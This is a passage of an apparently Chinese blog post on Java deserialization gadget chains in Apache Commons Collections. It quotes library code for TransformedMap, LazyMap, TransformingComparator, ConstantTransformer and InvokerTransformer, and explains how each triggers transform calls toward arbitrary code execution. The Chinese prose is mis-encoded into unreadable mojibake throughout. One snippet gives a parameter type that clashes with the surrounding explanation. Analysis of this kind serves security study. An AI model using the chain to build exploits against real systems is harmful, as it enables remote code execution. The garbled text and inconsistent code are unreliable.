è°ƒç”¨è½¬æ¢å™¨è½¬æ¢ key</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> object;  <span class="comment">// æ— è½¬æ¢å™¨ï¼Œè¿”å›åŸå§‹ value</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(object);  <span class="comment">// è°ƒç”¨è½¬æ¢å™¨è½¬æ¢ value</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;</span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);</span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>get</code> æ–¹æ³•ä¸ä¼šè§¦å‘ <code>transformKey</code> å‡½æ•°è°ƒç”¨ï¼Œè¿™æ˜¯å› ä¸º <code>TransformedMap</code> å¹¶æ²¡æœ‰å®ç° <code>get</code> æ–¹æ³•ï¼Œå› æ­¤ <code>get</code> å®é™…ä¸Šè°ƒç”¨çš„æ˜¯ <code>org.apache.commons.collections.map.AbstractMapDecorator#get</code>ï¼Œæœ€ç»ˆè°ƒç”¨çš„æ˜¯å†…éƒ¨è¢«ä¿®é¥°çš„ <code>map</code> çš„ <code>get</code> æ–¹æ³•ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p>å¦å¤–å¯¹ <code>TransformedMap</code> ç»§æ‰¿çš„ <code>AbstractInputCheckedMapDecorator</code> æœ‰å†…éƒ¨ç±» <code>MapEntry</code> ç”¨æ¥æè¿° <code>TransformedMap</code> ä¸­å­˜å‚¨çš„é”®å€¼å¯¹ã€‚ä¸‹å›¾æè¿°äº† <code>TransformedMap</code> åŠå…¶çˆ¶ç±» <code>AbstractInputCheckedMapDecorator</code> çš„å†…éƒ¨ç±»ä¹‹é—´çš„æ‰€å±å…³ç³»ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/images/MapEntry.png"
                      alt="MapEntry"
                ></p>
<p>å…¶ä¸­ <code>MapEntry</code> ä¸­çš„ <code>setValue</code> æ–¹æ³•ä¼šè°ƒç”¨ <code>parent</code> ä¹Ÿå°±æ˜¯ <code>TransformedMap</code> çš„ <code>checkSetValue</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>TransformedMap</code> çš„ <code>checkSetValue</code> æ–¹æ³•ä¼šè°ƒç”¨ <code>valueTransformer</code> çš„ <code>transform</code> æ–¹æ³•å¯¹ <code>value</code> åšè½¬æ¢ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œè¦è§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆ <code>AbstractInputCheckedMapDecorator$MapEntry</code> çš„ <code>parent</code> æ˜¯ <code>TransformedMap</code>ã€‚</p>
<p>é¦–å…ˆ <code>AbstractInputCheckedMapDecorator</code> æœ‰ä¸‰ä¸ªå†…éƒ¨ç±»ï¼š</p>
<ul>
<li><strong><code>EntrySet</code></strong> ï¼šåŒ…è£…åŸå§‹ <code>Map.entrySet()</code> çš„è¿”å›å€¼ï¼Œä¸º <code>Map.Entry</code> æä¾›é¢å¤–è¡Œä¸ºï¼ˆå¦‚æ‹¦æˆªã€æ ¡éªŒç­‰ï¼‰ã€‚</li>
<li><strong><code>EntrySetIterator</code></strong> ï¼šç”¨äºéå† <code>EntrySet</code>ï¼Œåœ¨ <code>next()</code> æ—¶è¿”å›åŒ…è£…è¿‡çš„ <code>MapEntry</code>ã€‚</li>
<li><strong><code>MapEntry</code></strong> ï¼šåŒ…è£…åŸå§‹çš„ <code>Map.Entry</code>ï¼Œå…¶ä¸»è¦èŒè´£æ˜¯åœ¨ <code>setValue()</code> è¢«è°ƒç”¨æ—¶ï¼Œå¯¹ä¼ å…¥çš„ value å€¼è¿›è¡Œæ ¡éªŒæˆ–è½¬æ¢ï¼Œé€šå¸¸ä¼šå›è°ƒ <code>parent.checkSetValue(...)</code>ã€‚</li>
</ul>
<p>å½“æˆ‘ä»¬è°ƒç”¨ <code>map.entrySet().iterator().next().setValue(&quot;newValue&quot;)</code> è¿™æ•´æ¡é“¾æ—¶ï¼Œç³»ç»Ÿä¼š<strong>ä¾æ¬¡è§¦å‘è¿™ä¸‰ä¸ªå†…éƒ¨ç±»çš„æ„é€ è¿‡ç¨‹</strong> ï¼Œæ¯ä¸€å±‚éƒ½è¿›è¡Œäº†ä¸€æ¬¡åŒ…è£…ï¼Œå¹¶å°† <code>parent</code> ä¼ é€’ä¸‹å»ï¼Œæœ€ç»ˆ <code>setValue()</code> è°ƒç”¨çš„æ˜¯åŒ…è£…è¿‡çš„ <code>MapEntry#setValue()</code>ï¼Œä»è€Œå®ç°äº†è‡ªå®šä¹‰çš„å€¼æ ¡éªŒæˆ–è½¬æ¢é€»è¾‘ã€‚</p>
<p>å½“ç¨‹åºæ˜¾å¼è°ƒç”¨äº† <code>map.entrySet()</code>ï¼Œæˆ–è€…éšå¼è°ƒç”¨ï¼ˆä¾‹å¦‚ <code>for (Map.Entry e : map.entrySet())</code>ï¼‰ï¼ŒJVM å°±ä¼šæ‰§è¡Œ <code>entrySet</code> è¿™ä¸ªæ–¹æ³•ï¼Œè¿™é‡Œå®é™…è°ƒç”¨çš„æ˜¯ <code>TransformedMap</code> çš„çˆ¶ç±» <code>AbstractInputCheckedMapDecorator</code> çš„ <code>entrySet()</code> æ–¹æ³•ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">isSetValueChecking</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isSetValueChecking()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySet</span>(map.entrySet(), <span class="built_in">this</span>); <span class="comment">// ğŸ‘ˆ ä¼ å…¥ TransformedMap ä½œä¸º parent</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.entrySet();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>è¿™é‡Œæ„é€ äº†ä¸€ä¸ªåŒ…è£…åçš„ <code>EntrySet</code>ï¼Œå¹¶æŠŠ <code>this</code>ï¼ˆå³å½“å‰çš„ <code>TransformedMap</code> å®ä¾‹ï¼‰ä¼ å…¥ï¼Œä½œä¸º <code>EntrySet</code> çš„ <code>parent</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">EntrySet</span><span class="params">(Set set, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(set);</span><br><span class="line">    <span class="built_in">this</span>.parent = parent; <span class="comment">// ğŸ‘ˆ æ„é€  EntrySet æ—¶ä¼ å…¥ parent</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¹‹åæ‰§è¡Œ <code>entrySet().iterator()</code> è°ƒç”¨çš„æ˜¯ <code>EntrySet</code> çš„ <code>iterator()</code> æ–¹æ³•ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySetIterator</span>(collection.iterator(), parent); <span class="comment">// ğŸ‘ˆ æŠŠ parent ç»§ç»­ä¼ ä¸‹å»</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>EntrySetIterator</code> å°†ä¼ å…¥çš„ <code>parent</code> ä½œä¸ºè‡ªèº« <code>parent</code> å±æ€§çš„å€¼ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">EntrySetIterator</span><span class="params">(Iterator iterator, AbstractDualBidiMap parent)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(iterator);</span><br><span class="line">    <span class="built_in">this</span>.parent = parent;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>åœ¨å¢å¼º for å¾ªç¯ä¸­éšå¼è°ƒç”¨ <code>iterator()</code>ã€‚è¿™æ˜¯éå† <code>Set</code> æ—¶çš„æ ‡å‡†è°ƒç”¨æµç¨‹ã€‚å…¶ä¸­ <code>EntrySetIterator</code> æ˜¯è‡ªå®šä¹‰çš„è¿­ä»£å™¨ï¼Œç”¨äºå¯¹è¿”å›çš„ <code>Map.Entry</code> åšè¿›ä¸€æ­¥åŒ…è£…å’Œæ‹¦æˆªã€‚</p>
</blockquote>
<p>å†ä¹‹åæ‰§è¡Œ <code>iterator().next()</code> çš„æ—¶å€™ï¼ŒJVM ä¼šè§¦å‘ <code>EntrySetIterator</code> çš„ <code>next()</code> æ–¹æ³•ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) iterator.next(); <span class="comment">// åŸå§‹ entry</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapEntry</span>(entry, parent);            <span class="comment">// ğŸ‘ˆ æ„é€  MapEntry æ—¶ä¼ å…¥ parent</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>iterator().next()</code> æˆ–éšå¼æ‰§è¡Œ <code>for</code> å¾ªç¯æ—¶ï¼Œéœ€è¦è¿”å›ä¸‹ä¸€ä¸ªæ¡ç›®ï¼Œè¿™æ—¶å€™å°±éœ€è¦æ„é€ ä¸€ä¸ª <code>MapEntry</code>ã€‚åœ¨ <code>MapEntry</code> ä¸­ <code>parent</code> è¢«åˆå§‹åŒ–ä¸ºæœ€åˆä¼ å…¥çš„ <code>parent</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(entry);</span><br><span class="line">    <span class="built_in">this</span>.parent = parent; <span class="comment">// ğŸ‘ˆ parent æ­£æ˜¯æœ€æ—©çš„ TransformedMap</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="LazyMap"><a href="#LazyMap" class="headerlink" title="LazyMap"></a>LazyMap</h4><p><code>LazyMap</code> å’Œ <code>TransformedMap</code> ç±»ä¼¼ï¼Œéƒ½æ¥è‡ªäº Common-Collections åº“ï¼Œå¹¶ç»§æ‰¿ <code>AbstractMapDecorator</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p>åœ¨ Common-Collections4 ä¸­ <code>decorate</code> æ–¹æ³•æ”¹åä¸º <code>lazyMap</code>ï¼Œä½†æ˜¯åœ¨å®ç°ä¸Šæ²¡æœ‰å˜åŒ–ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.lazyMap(innerMap, transformerChain)</span><br></pre></td></tr></table></figure></div>

    </div>
  </div>

<p><code>LazyMap#decorate</code> å®é™…ä¸Šæ˜¯åˆ›å»ºäº†ä¸€ä¸ª <code>LazyMap</code> å¯¹è±¡ï¼Œå¹¶ä¸”æ ¹æ®å‚æ•°è®¾ç½® <code>factory</code> ä¸ºæˆ‘ä»¬ä¼ å…¥çš„ <code>Transformer</code> å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.factory = factory;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">LazyMap</span>(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ä¸ <code>TransformedMap</code> ä¸åŒçš„æ˜¯ <code>LazyMap</code> å¹¶ä¸ç»§æ‰¿äº <code>AbstractInputCheckedMapDecorator</code>ï¼Œè€Œæ˜¯ç›´æ¥ç»§æ‰¿äº <code>AbstractMapDecorator</code>ã€‚å› æ­¤ <code>TransformedMap</code> ä¸ç»§æ‰¿ <code>AbstractInputCheckedMapDecorator</code> ä¸­ç”¨çš„å†…éƒ¨ç±»ï¼Œä¹Ÿå°±æ²¡æœ‰äº† <code>TransformedMap</code> çš„ <code>setValue</code> çš„è§¦å‘æ–¹å¼ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2025/10/21/Java%20%E5%B8%B8%E8%A7%81%E7%BB%84%E4%BB%B6/images/LazyMap.png"
                     
                ></p>
<p>ä¸è¿‡ç”±äº <code>TransformedMap</code> åŒæ ·ç»§æ‰¿äº <code>AbstractMapDecorator</code>ï¼Œå› æ­¤è¢«ä¿®é¥°çš„ <code>Map</code> åŒæ ·ä¼šåœ¨ <code>AbstractMapDecorator</code> çš„æ„é€ å‡½æ•°ä¸­ä¿å­˜åˆ°æˆå‘˜å˜é‡ä¸Šã€‚</p>
<p><code>LazyMap</code> çš„æ¼æ´è§¦å‘ç‚¹å’Œ <code>TransformedMap</code> å”¯ä¸€çš„å·®åˆ«æ˜¯ï¼Œ<code>TransformedMap</code> æ˜¯åœ¨å†™å…¥å…ƒç´ çš„æ—¶å€™æ‰§è¡Œ <code>transform</code>ï¼Œè€Œ <code>LazyMap</code> æ˜¯åœ¨å…¶ <code>get</code> æ–¹æ³•ä¸­æ‰§è¡Œçš„ <code>factory.transform</code>ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœmapä¸­å½“å‰ä¸åŒ…å«keyï¼Œåˆ™ä¸ºkeyåˆ›å»ºä¸€ä¸ªå€¼</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key); <span class="comment">// ğŸ‘ˆ è°ƒç”¨transformè½¬æ¢keyç”Ÿæˆå¯¹åº”çš„å€¼</span></span><br><span class="line">        map.put(key, value); <span class="comment">// å°†keyå’Œå€¼æ”¾å…¥mapä¸­</span></span><br><span class="line">        <span class="keyword">return</span> value; <span class="comment">// è¿”å›ç”Ÿæˆçš„å€¼</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.get(key); <span class="comment">// å¦‚æœmapä¸­å·²åŒ…å«keyï¼Œåˆ™è¿”å›å¯¹åº”çš„å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large red">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>æ³¨æ„</p>

    </div>
    <div class="notel-content markdown-body">
      <p><code>LazyMap</code> åœ¨å…¶ <code>get</code> æ–¹æ³•ä¸­æ‰§è¡Œçš„ <code>factory.transform</code> çš„æ¡ä»¶æ˜¯ <code>LazyMap</code> æ²¡æœ‰å½“å‰æŸ¥è¯¢çš„ <code>key</code>ï¼Œå¹¶ä¸”æŸ¥è¯¢åä¼šå°† <code>(key, factory.transform(key))</code> æ”¾å…¥ <code>map</code>ã€‚</p>
<p>ä¹Ÿå°±æ˜¯è¯´å¯¹äºä¸€ä¸ªç‰¹å®šçš„ <code>key</code>ï¼Œæˆ‘ä»¬åªèƒ½è°ƒç”¨ä¸€æ¬¡ <code>transform</code> ã€‚é™¤éè°ƒç”¨ <code>Map.clear</code> æ–¹æ³•æ¸…ç©º <code>LazyMap</code> ã€‚</p>

    </div>
  </div>

<h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p><code>TransformingComparator</code> å®ç°äº† <code>java.util.Comparator</code> æ¥å£ï¼Œè¿™ä¸ªæ¥å£ç”¨äºå®šä¹‰ä¸¤ä¸ªå¯¹è±¡å¦‚ä½•è¿›è¡Œæ¯”è¾ƒã€‚å¯¹äºä¸€äº›éœ€è¦ç»´æŠ¤é¡ºåºçš„æ•°æ®ç»“æ„ï¼ˆå¦‚ <code>java.util.PriorityQueue</code>ï¼‰ï¼Œå¦‚æœä¼ å…¥ <code>TransformingComparator</code> ç”¨äºä¸¤ä¸ªå¯¹è±¡çš„æ¯”è¾ƒï¼Œé‚£ä¹ˆæ¯”è¾ƒä¸¤ä¸ªå¯¹è±¡çš„æ—¶å€™ä¼šè°ƒç”¨ <code>TransformingComparator</code> çš„ <code>compare</code> æ–¹æ³•ã€‚åœ¨ <code>compare</code> æ–¹æ³•å†…éƒ¨ä¼šè°ƒç”¨å…¶ä¸­ <code>transformer</code> æˆå‘˜çš„ <code>transform</code> æ–¹æ³•å¹¶ä¼ å…¥è¿›è¡Œæ¯”è¾ƒçš„å¯¹è±¡ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object obj1, Object obj2)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>TransformingComparator</code> çš„æ„é€ å‡½æ•°å¦‚ä¸‹ï¼Œè¿™é‡Œçš„ <code>transformer</code> å°±æ˜¯æˆ‘ä»¬æ„é€ çš„ <code>Transformer</code> ç»“æ„ï¼Œå¦å¤– <code>decorated</code> å¦‚æœä¸æŒ‡å®šä¼šä¼ å…¥ <code>new ComparableComparator()</code> ã€‚</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>(transformer, <span class="keyword">new</span> <span class="title class_">ComparableComparator</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TransformingComparator</span><span class="params">(Transformer transformer, Comparator decorated)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.decorated = decorated;</span><br><span class="line">    <span class="built_in">this</span>.transformer = transformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="Transformer-çš„æ¥å£å®ç°ç±»"><a href="#Transformer-çš„æ¥å£å®ç°ç±»" class="headerlink" title="Transformer çš„æ¥å£å®ç°ç±»"></a>Transformer çš„æ¥å£å®ç°ç±»</h3><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p><code>ConstantTransformer</code> åœ¨æ„é€ å‡½æ•°çš„æ—¶å€™ä¼ å…¥ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶åœ¨ <code>transform</code> æ–¹æ³•å°†è¿™ä¸ªå¯¹è±¡å†è¿”å›ï¼š</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> constantToReturn  æ¯æ¬¡è°ƒç”¨æ—¶è¿”å›çš„å¸¸é‡</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * é€šè¿‡å¿½ç•¥è¾“å…¥å¯¹è±¡å¹¶è¿”å›å­˜å‚¨çš„å¸¸é‡æ¥è½¬æ¢è¾“å…¥ã€‚</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> input  è¢«å¿½ç•¥çš„è¾“å…¥å¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> å­˜å‚¨çš„å¸¸é‡</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ <code>Transformer</code> æ„é€ çš„ä»£ç æ‰§è¡Œæµä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ <code>ConstantTransformer</code> ç†è§£ä¸ºä¸€ä¸ªå¸¸é‡ï¼Œå¯ä»¥è¿”å›ä¸€ä¸ªç¡®å®šçš„å¯¹è±¡ã€‚</p>
<p>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥å±è”½å‰é¢å®šä¹‰çš„ <code>readObject</code> æ–¹æ³•è§¦å‘ <code>transform</code> æ–¹æ³•è°ƒç”¨æ—¶ä¼ å…¥çš„ <code>input</code> å‚æ•°å¯¹æˆ‘ä»¬æ„é€ çš„ <code>Transformer</code> ä»£ç æ‰§è¡Œæµäº§ç”Ÿå½±å“ã€‚</p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p><code>InvokerTransformer</code> å¯ä»¥å¯¹ <code>transform</code> æ–¹æ³•ä¼ å…¥çš„å¯¹è±¡å‚æ•°è°ƒç”¨ä»»æ„æ–¹æ³•å¹¶ä¼ å…¥ä»»æ„å‚æ•°ï¼Œè¿™ä¹Ÿæ˜¯ååºåˆ—åŒ–èƒ½æ‰§è¡Œä»»æ„ä»£ç çš„å…³é”®ã€‚</p>
<p>åœ¨å®ä¾‹åŒ–è¿™ä¸ª <code>InvokerTransformer</code> æ—¶ï¼Œéœ€è¦ä¼ å…¥ä¸‰ä¸ªå‚æ•°ï¼š</p>
<ul>
<li><code>String methodName</code>ï¼šå¾…æ‰§è¡Œçš„å‡½æ•°å</li>
<li><code>Class[] paramTypes</code>ï¼šè¿™ä¸ªå‡½æ•°çš„å‚æ•°ç±»å‹åˆ—è¡¨</li>
<li><code>Object[] args</code>ï¼šä¼ ç»™è¿™ä¸ªå‡½æ•°çš„å‚æ•°åˆ—è¡¨</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> methodName  è¦è°ƒç”¨çš„æ–¹æ³•åç§°</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> paramTypes  æ„é€ æ–¹æ³•çš„å‚æ•°ç±»å‹æ•°ç»„ï¼Œå‚æ•°ä¸ä¼šè¢«å¤åˆ¶</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> args  æ„é€ æ–¹æ³•çš„å‚æ•°æ•°ç»„ï¼Œå‚æ•°ä¸ä¼šè¢«å¤åˆ¶</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">    <span 